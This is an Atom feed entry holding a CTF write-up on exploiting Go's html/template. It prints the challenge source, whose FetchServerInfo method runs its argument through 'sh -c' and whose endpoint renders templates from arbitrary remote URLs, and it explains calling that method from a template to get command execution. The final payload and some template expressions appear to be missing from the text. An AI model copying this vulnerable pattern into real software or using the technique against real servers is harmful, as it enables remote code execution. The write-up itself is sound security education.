@@ -1,0 +1,1038 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2025-02-04T14:13:35+00:00</updated><id>/feed.xml</id><title type="html">LetzPwn - Luxembourgish CTF Team</title><subtitle></subtitle><entry><title type="html">RenderQuest</title><link href="/writeup/2023/11/10/RenderQuest.html" rel="alternate" type="text/html" title="RenderQuest" /><published>2023-11-10T23:10:05+00:00</published><updated>2023-11-10T23:10:05+00:00</updated><id>/writeup/2023/11/10/RenderQuest</id><content type="html" xml:base="/writeup/2023/11/10/RenderQuest.html"><![CDATA[<h2 id="description">Description</h2>
+<blockquote>
+  <p>You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck!</p>
+  <h2 id="tldr">TL;DR</h2>
+  <p>Exploiting method confusion in Go’s html/template package for RCE.</p>
+  <h2 id="complete-writeup">Complete Writeup</h2>
+</blockquote>
+
+<p>When visiting the website, we are greeted with the following screen, automatically requesting a <code class="language-plaintext highlighter-rouge">/render</code> endpoint with a GET parameter <code class="language-plaintext highlighter-rouge">page</code> set to <code class="language-plaintext highlighter-rouge">index.tpl</code>:</p>
+
+<p><img src="img/RenderQuest/thumbnail_image.png" alt="" />
+To get an idea of what we’re dealing with, let’s look at the files we got for download:
+<img src="img/Pasted image 20231111225407.png" alt="" />
+Seems like the most interesting one will be <code class="language-plaintext highlighter-rouge">main.go</code>. We also detect the <code class="language-plaintext highlighter-rouge">index.tpl</code> file that has put as GET request parameter to the <code class="language-plaintext highlighter-rouge">/render</code> endpoint.</p>
+
+<p>So what does this web application seem to do? Let’s take a look at the code in <code class="language-plaintext highlighter-rouge">main.go</code>:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"encoding/json"</span>
+	<span class="s">"fmt"</span>
+	<span class="s">"html/template"</span>
+	<span class="s">"io"</span>
+	<span class="s">"net/http"</span>
+	<span class="s">"os"</span>
+	<span class="s">"os/exec"</span>
+	<span class="s">"path/filepath"</span>
+	<span class="s">"strings"</span>
+<span class="p">)</span>
+
+<span class="k">const</span> <span class="n">WEB_PORT</span> <span class="o">=</span> <span class="s">"1337"</span>
+<span class="k">const</span> <span class="n">TEMPLATE_DIR</span> <span class="o">=</span> <span class="s">"./templates"</span>
+
+<span class="k">type</span> <span class="n">LocationInfo</span> <span class="k">struct</span> <span class="p">{</span>
+	<span class="n">IpVersion</span>     <span class="kt">int</span>     <span class="s">`json:"ipVersion"`</span>
+	<span class="n">IpAddress</span>     <span class="kt">string</span>  <span class="s">`json:"ipAddress"`</span>
+	<span class="n">Latitude</span>      <span class="kt">float64</span> <span class="s">`json:"latitude"`</span>
+	<span class="n">Longitude</span>     <span class="kt">float64</span> <span class="s">`json:"longitude"`</span>
+	<span class="n">CountryName</span>   <span class="kt">string</span>  <span class="s">`json:"countryName"`</span>
+	<span class="n">CountryCode</span>   <span class="kt">string</span>  <span class="s">`json:"countryCode"`</span>
+	<span class="n">TimeZone</span>      <span class="kt">string</span>  <span class="s">`json:"timeZone"`</span>
+	<span class="n">ZipCode</span>       <span class="kt">string</span>  <span class="s">`json:"zipCode"`</span>
+	<span class="n">CityName</span>      <span class="kt">string</span>  <span class="s">`json:"cityName"`</span>
+	<span class="n">RegionName</span>    <span class="kt">string</span>  <span class="s">`json:"regionName"`</span>
+	<span class="n">Continent</span>     <span class="kt">string</span>  <span class="s">`json:"continent"`</span>
+	<span class="n">ContinentCode</span> <span class="kt">string</span>  <span class="s">`json:"continentCode"`</span>
+<span class="p">}</span>
+
+<span class="k">type</span> <span class="n">MachineInfo</span> <span class="k">struct</span> <span class="p">{</span>
+	<span class="n">Hostname</span>      <span class="kt">string</span>
+	<span class="n">OS</span>            <span class="kt">string</span>
+	<span class="n">KernelVersion</span> <span class="kt">string</span>
+	<span class="n">Memory</span>        <span class="kt">string</span>
+<span class="p">}</span>
+
+<span class="k">type</span> <span class="n">RequestData</span> <span class="k">struct</span> <span class="p">{</span>
+	<span class="n">ClientIP</span>     <span class="kt">string</span>
+	<span class="n">ClientUA</span>     <span class="kt">string</span>
+	<span class="n">ServerInfo</span>   <span class="n">MachineInfo</span>
+	<span class="n">ClientIpInfo</span> <span class="n">LocationInfo</span> <span class="s">`json:"location"`</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="p">(</span><span class="n">p</span> <span class="n">RequestData</span><span class="p">)</span> <span class="n">FetchServerInfo</span><span class="p">(</span><span class="n">command</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="p">(</span><span class="n">p</span> <span class="n">RequestData</span><span class="p">)</span> <span class="n">GetLocationInfo</span><span class="p">(</span><span class="n">endpointURL</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="n">LocationInfo</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">endpointURL</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">err</span>
+	<span class="p">}</span>
+
+	<span class="k">defer</span> <span class="n">resp</span><span class="o">.</span><span class="n">Body</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
+
+	<span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">StatusCode</span> <span class="o">!=</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusOK</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"HTTP request failed with status code: %d"</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">StatusCode</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="n">body</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">io</span><span class="o">.</span><span class="n">ReadAll</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">Body</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">err</span>
+	<span class="p">}</span>
+
+	<span class="k">var</span> <span class="n">locationInfo</span> <span class="n">LocationInfo</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">json</span><span class="o">.</span><span class="n">Unmarshal</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">locationInfo</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="no">nil</span><span class="p">,</span> <span class="n">err</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="o">&amp;</span><span class="n">locationInfo</span><span class="p">,</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">isSubdirectory</span><span class="p">(</span><span class="n">basePath</span><span class="p">,</span> <span class="n">path</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
+	<span class="n">rel</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Rel</span><span class="p">(</span><span class="n">basePath</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="no">false</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">rel</span><span class="p">,</span> <span class="s">".."</span><span class="o">+</span><span class="kt">string</span><span class="p">(</span><span class="n">filepath</span><span class="o">.</span><span class="n">Separator</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">readFile</span><span class="p">(</span><span class="n">filepath</span> <span class="kt">string</span><span class="p">,</span> <span class="n">basePath</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"filepath: "</span> <span class="o">+</span> <span class="n">filepath</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"basePath: "</span> <span class="o">+</span> <span class="n">basePath</span><span class="p">)</span>
+	<span class="k">if</span> <span class="o">!</span><span class="n">isSubdirectory</span><span class="p">(</span><span class="n">basePath</span><span class="p">,</span> <span class="n">filepath</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span><span class="p">,</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"Invalid filepath"</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="n">data</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span><span class="p">,</span> <span class="n">err</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">readRemoteFile</span><span class="p">(</span><span class="n">url</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">response</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span><span class="p">,</span> <span class="n">err</span>
+	<span class="p">}</span>
+
+	<span class="k">defer</span> <span class="n">response</span><span class="o">.</span><span class="n">Body</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
+
+	<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">StatusCode</span> <span class="o">!=</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusOK</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span><span class="p">,</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"HTTP request failed with status code: %d"</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">StatusCode</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="n">content</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">io</span><span class="o">.</span><span class="n">ReadAll</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">Body</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span><span class="p">,</span> <span class="n">err</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">content</span><span class="p">),</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">http</span><span class="o">.</span><span class="n">Redirect</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="s">"/render?page=index.tpl"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusMovedPermanently</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">getTpl</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="n">page</span> <span class="kt">string</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Query</span><span class="p">()</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"page"</span><span class="p">)</span>
+	<span class="k">var</span> <span class="n">remote</span> <span class="kt">string</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Query</span><span class="p">()</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"use_remote"</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">page</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
+		<span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"Missing required parameters"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusBadRequest</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="n">reqData</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">RequestData</span><span class="p">{}</span>
+
+	<span class="n">userIPCookie</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">Cookie</span><span class="p">(</span><span class="s">"user_ip"</span><span class="p">)</span>
+	<span class="n">clientIP</span> <span class="o">:=</span> <span class="s">""</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">clientIP</span> <span class="o">=</span> <span class="n">userIPCookie</span><span class="o">.</span><span class="n">Value</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="n">clientIP</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">RemoteAddr</span><span class="p">,</span> <span class="s">":"</span><span class="p">)[</span><span class="m">0</span><span class="p">]</span>
+	<span class="p">}</span>
+
+	<span class="n">userAgent</span> <span class="o">:=</span> <span class="n">r</span><span class="o">.</span><span class="n">Header</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"User-Agent"</span><span class="p">)</span>
+
+	<span class="n">locationInfo</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">reqData</span><span class="o">.</span><span class="n">GetLocationInfo</span><span class="p">(</span><span class="s">"https://freeipapi.com/api/json/"</span> <span class="o">+</span> <span class="n">clientIP</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+		<span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"Could not fetch IP location info"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusInternalServerError</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ClientIP</span> <span class="o">=</span> <span class="n">clientIP</span>
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ClientUA</span> <span class="o">=</span> <span class="n">userAgent</span>
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ClientIpInfo</span> <span class="o">=</span> <span class="o">*</span><span class="n">locationInfo</span>
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ServerInfo</span><span class="o">.</span><span class="n">Hostname</span> <span class="o">=</span> <span class="n">reqData</span><span class="o">.</span><span class="n">FetchServerInfo</span><span class="p">(</span><span class="s">"hostname"</span><span class="p">)</span>
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ServerInfo</span><span class="o">.</span><span class="n">OS</span> <span class="o">=</span> <span class="n">reqData</span><span class="o">.</span><span class="n">FetchServerInfo</span><span class="p">(</span><span class="s">"cat /etc/os-release | grep PRETTY_NAME | cut -d '</span><span class="se">\"</span><span class="s">' -f 2"</span><span class="p">)</span>
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ServerInfo</span><span class="o">.</span><span class="n">KernelVersion</span> <span class="o">=</span> <span class="n">reqData</span><span class="o">.</span><span class="n">FetchServerInfo</span><span class="p">(</span><span class="s">"uname -r"</span><span class="p">)</span>
+	<span class="n">reqData</span><span class="o">.</span><span class="n">ServerInfo</span><span class="o">.</span><span class="n">Memory</span> <span class="o">=</span> <span class="n">reqData</span><span class="o">.</span><span class="n">FetchServerInfo</span><span class="p">(</span><span class="s">"free -h | awk '/^Mem/{print $2}'"</span><span class="p">)</span>
+
+	<span class="k">var</span> <span class="n">tmplFile</span> <span class="kt">string</span>
+
+	<span class="k">if</span> <span class="n">remote</span> <span class="o">==</span> <span class="s">"true"</span> <span class="p">{</span>
+		<span class="n">tmplFile</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">readRemoteFile</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+
+		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+			<span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"Internal Server Error"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusInternalServerError</span><span class="p">)</span>
+			<span class="k">return</span>
+		<span class="p">}</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="n">tmplFile</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">readFile</span><span class="p">(</span><span class="n">TEMPLATE_DIR</span><span class="o">+</span><span class="s">"/"</span><span class="o">+</span><span class="n">page</span><span class="p">,</span> <span class="s">"./"</span><span class="p">)</span>
+
+		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+			<span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"Internal Server Error"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusInternalServerError</span><span class="p">)</span>
+			<span class="k">return</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	<span class="n">tmpl</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">template</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="s">"page"</span><span class="p">)</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">tmplFile</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+		<span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"Internal Server Error"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusInternalServerError</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">reqData</span><span class="p">)</span>
+
+	<span class="n">err</span> <span class="o">=</span> <span class="n">tmpl</span><span class="o">.</span><span class="n">Execute</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">reqData</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+		<span class="n">http</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="s">"Internal Server Error"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StatusInternalServerError</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">mux</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">NewServeMux</span><span class="p">()</span>
+
+	<span class="n">mux</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">getIndex</span><span class="p">)</span>
+	<span class="n">mux</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/render"</span><span class="p">,</span> <span class="n">getTpl</span><span class="p">)</span>
+	<span class="n">mux</span><span class="o">.</span><span class="n">Handle</span><span class="p">(</span><span class="s">"/static/"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">StripPrefix</span><span class="p">(</span><span class="s">"/static/"</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">FileServer</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="s">"static"</span><span class="p">))))</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Server started at port "</span> <span class="o">+</span> <span class="n">WEB_PORT</span><span class="p">)</span>
+	<span class="n">http</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">":"</span><span class="o">+</span><span class="n">WEB_PORT</span><span class="p">,</span> <span class="n">mux</span><span class="p">)</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>As the description says, it seems the web application renders HTML templates. It supports loading templates either from a local directory (<code class="language-plaintext highlighter-rouge">./templates</code>) or remotely via a URL.
+For each request, it fetches the location information of the client’s IP address using an external API (<code class="language-plaintext highlighter-rouge">freeipapi.com</code>). The application also collects information about the server itself, such as hostname, operating system, kernel version, and memory, using shell commands. The <code class="language-plaintext highlighter-rouge">/render</code> endpoint handles the main logic. It fetches the requested page (template) and decides whether to load it from a local directory or a remote URL based on the query parameter <code class="language-plaintext highlighter-rouge">use_remote</code>.
+The application also constructs a <code class="language-plaintext highlighter-rouge">RequestData</code> object containing client IP, user agent, client IP location info, and server info, which is then passed to the template for rendering. This <code class="language-plaintext highlighter-rouge">RequestData</code> object (instantiated as <code class="language-plaintext highlighter-rouge">reqData</code>) is later also used as data parameter in the <code class="language-plaintext highlighter-rouge">.Execute()</code> of the template: <code class="language-plaintext highlighter-rouge">tmpl.Execute(w, reqData)</code>.
+Let’s see if we can provide a template that will be rendered by the server. As an example, let’s take their <code class="language-plaintext highlighter-rouge">index.tpl</code> file and change it so that something will be rendered. The only change I made is instead of the line <code class="language-plaintext highlighter-rouge">&lt;li&gt;ServerInfo.OS&lt;/li&gt;</code> I put <code class="language-plaintext highlighter-rouge">&lt;li&gt;&lt;/li&gt;</code> (you can call any of the properties of the object that is being rendered (<code class="language-plaintext highlighter-rouge">reqData</code> object in the data parameter of the <code class="language-plaintext highlighter-rouge">Execute()</code> function) by putting a <code class="language-plaintext highlighter-rouge">.</code> and then the name of the property, e.g. <code class="language-plaintext highlighter-rouge">.ServerInfo.OS</code> here).
+I copy the file into another directory, start a python http server and tunnel that using ngrok. I provide the url to my index.tpl to the web app and indeed instead of this
+<img src="img/Pasted image 20231111233915.png" alt="" />
+we got this
+<img src="img/Pasted image 20231111233849.png" alt="" />
+So it seems it is being rendered properly. Now apart from template injection, there is one other thing that stands out: Can we just tell it to “render” the flag file, à la path traversal in the <code class="language-plaintext highlighter-rouge">page</code> parameter?
+There are 2 problems with that.</p>
+<ol>
+  <li>First of all, we got an entrypoint.sh script, executed by the Dockerfile on startup of the container, that changes the flag file name so that it incorporates 10 random characters, so we don’t know what file we’re looking for exactly:
+<img src="img/Pasted image 20231111234146.png" alt="" /></li>
+  <li>Second, there is actually some code that verifies if the given path is within the allowed directory: 
+<img src="img/Pasted image 20231111234506.png" alt="" /></li>
+</ol>
+
+<p>So, onto template injection. Since we dont have to inject into a specific parameter that is being rendered in a fixed template, but we can provide the WHOLE template ourselves, this should be easy?!
+Problem is, we are not dealing with a template package like Jinja2 for Python (where <code class="language-plaintext highlighter-rouge">eval()</code>could be called within the template) or EJS for Javascript (also allowing javascript execution if untrusted unescaped data is allowed within the template): We are dealing with html/template package for Golang. This package is designed to be secure by default and does not allow the execution of arbitrary code or external commands, which limits the scope of an attacker massively. So it seems like this challenge is not about finding a crack in the web app to inject a payload into the template, but to find a weakness in Go’s html/template package itself, having complete control over the template.</p>
+
+<p>Let’s examine https://pkg.go.dev/html/template:</p>
+
+<blockquote>
+  <p>Package template (html/template) implements data-driven templates for generating HTML output safe against code injection. It provides the same interface as <a href="https://pkg.go.dev/text/template">text/template</a> and should be used instead of <a href="https://pkg.go.dev/text/template">text/template</a> whenever the output is HTML.
+The documentation here focuses on the security features of the package. For information about how to program the templates themselves, see the documentation for <a href="https://pkg.go.dev/text/template">text/template</a>.</p>
+</blockquote>
+
+<p>So far so good, much secure ok ok. A little further down, this stands out though:</p>
+
+<blockquote>
+  <p>The security model used by this package <strong>assumes that template authors are trusted, while Execute’s data parameter is not</strong>.</p>
+</blockquote>
+
+<p>Seems like the assumption that the template authors are trusted is not so good for our web application. Can we find an exploit somewhere online about Go’s html/template package that relates to this?</p>
+
+<p>A quick google search finds this one: https://www.onsecurity.io/blog/go-ssti-method-research/. This resource describes a vulnerability in Go’s html/template package, which allows a malicious user who has more flexible control over a template (more than just being able to control the <code class="language-plaintext highlighter-rouge">Execute()</code>’s data parameter’), to call methods that are an attribute of the value passed to the template:</p>
+
+<blockquote>
+  <p>Upon experimenting with the previously stated functionality (you can call any of the properties of the object that you render into the template), I was wondering if you could equally call a method through a template injection, as long as the method is an attribute of the value passed to the template. This lead me to finding out that you can in fact call methods, and <strong>even specify explicit parameters</strong>, similar to how you would in a deserialization attack.</p>
+</blockquote>
+
+<p>In our example, the methods <code class="language-plaintext highlighter-rouge">FetchServerInfo</code> and <code class="language-plaintext highlighter-rouge">GetLocationInfo</code> ARE in fact attributes/methods of the <code class="language-plaintext highlighter-rouge">reqData</code> object. This is defined by the method receiver in the function definition: <code class="language-plaintext highlighter-rouge">FetchServerInfo</code> belongs to <code class="language-plaintext highlighter-rouge">RequestData</code> type (the object type of <code class="language-plaintext highlighter-rouge">reqData</code>).</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">p</span> <span class="n">RequestData</span><span class="p">)</span> <span class="n">FetchServerInfo</span><span class="p">(</span><span class="n">command</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">""</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This means we can call this function and as the resource says, even specify explicit parameters.</p>
+
+<p>The FetchServerInfo method has a parameter that is being executed as a system command, so according to the resource, this should allow us to get the flag in no time. The payload I built looks as follows:</p>
+
+<p>This also provides an easy workaround with the issue of the random name of the flag file. Using this payload in a template provided to the web app gives us the flag:</p>
+
+<p><img src="img/Pasted image 20231112002304.png" alt="" /></p>
+
